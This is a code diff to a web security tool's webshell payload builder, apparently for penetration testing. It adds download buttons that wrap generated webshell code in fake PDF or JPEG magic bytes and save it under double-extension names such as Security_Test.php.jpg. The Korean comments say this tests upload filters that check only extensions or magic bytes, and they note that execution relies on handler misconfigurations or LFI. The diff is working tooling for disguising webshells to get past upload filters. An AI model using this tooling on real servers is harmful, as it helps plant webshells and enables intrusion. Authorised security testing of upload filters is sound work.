@@ -10,6 +10,20 @@ const FILE_INFO: Record<string, { ext: string; mime: string }> = {
   Perl: { ext: 'pl', mime: 'application/x-perl' },
 }
 
+/** 업로드 필터(확장자/매직바이트) 우회 테스트용 위장 포맷. 컨테이너 자체가 코드를 실행하는 것이
+ * 아니라, 이중 확장자·매직바이트 검사만 하는 서버 설정을 테스트하기 위한 것이다. */
+const DISGUISE_TARGETS: { id: string; label: string; ext: string; mime: string; magic?: string }[] = [
+  { id: 'html', label: 'HTML 위장', ext: 'html', mime: 'text/html' },
+  { id: 'pdf', label: 'PDF 위장', ext: 'pdf', mime: 'application/pdf', magic: '%PDF-1.4\n' },
+  { id: 'docx', label: 'Word(DOCX) 위장', ext: 'docx', mime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' },
+  { id: 'txt', label: 'TXT 위장', ext: 'txt', mime: 'text/plain' },
+  { id: 'md', label: 'Markdown 위장', ext: 'md', mime: 'text/markdown' },
+  { id: 'jpg', label: 'JPG 위장 (JPEG 매직바이트)', ext: 'jpg', mime: 'image/jpeg', magic: 'ÿØÿà\n' },
+  { id: 'jpeg', label: 'JPEG 위장 (JPEG 매직바이트)', ext: 'jpeg', mime: 'image/jpeg', magic: 'ÿØÿà\n' },
+  { id: 'mkv', label: 'MKV 위장', ext: 'mkv', mime: 'video/x-matroska' },
+  { id: 'mp4', label: 'MP4 위장', ext: 'mp4', mime: 'video/mp4' },
+]
+
 export function WebshellPayloadBuilder() {
   const [lang, setLang] = useState<'PHP' | 'JSP' | 'ASPX' | 'ASP' | 'Perl'>('PHP')
   const [param, setParam] = useState('cmd')
@@ -61,6 +75,26 @@ export function WebshellPayloadBuilder() {
           a.click()
           URL.revokeObjectURL(url)
         }}><Download size={14}/>다운로드 (Security_Test.{ext})</button>
+      </div>
+
+      <div className="payload-readout-group">
+        <strong className="payload-group-title">업로드 필터 우회용 위장 포맷</strong>
+        <Note>이중 확장자/매직바이트 검사만 하는 업로드 필터를 테스트하기 위한 것입니다. 컨테이너 포맷 자체가 코드를 실행하지는 않으며, 실제 실행 여부는 서버가 이중 확장자(.{ext}.jpg 등)를 신뢰하는지, 확장자 기반 핸들러(AddHandler)가 걸려 있는지, 또는 LFI와 결합되는지에 달려 있습니다.</Note>
+        {DISGUISE_TARGETS.map(target => (
+          <button
+            key={target.id}
+            className="secondary-button csrf-action-btn"
+            onClick={() => {
+              const content = (target.magic ?? '') + code
+              const blob = new Blob([content], { type: target.mime })
+              const url = URL.createObjectURL(blob)
+              const a = document.createElement('a')
+              a.href = url; a.download = `Security_Test.${ext}.${target.ext}`
+              a.click()
+              URL.revokeObjectURL(url)
+            }}
+          ><Download size={14}/>{target.label} (Security_Test.{ext}.{target.ext})</button>
+        ))}
       </div>
     </div>
   )
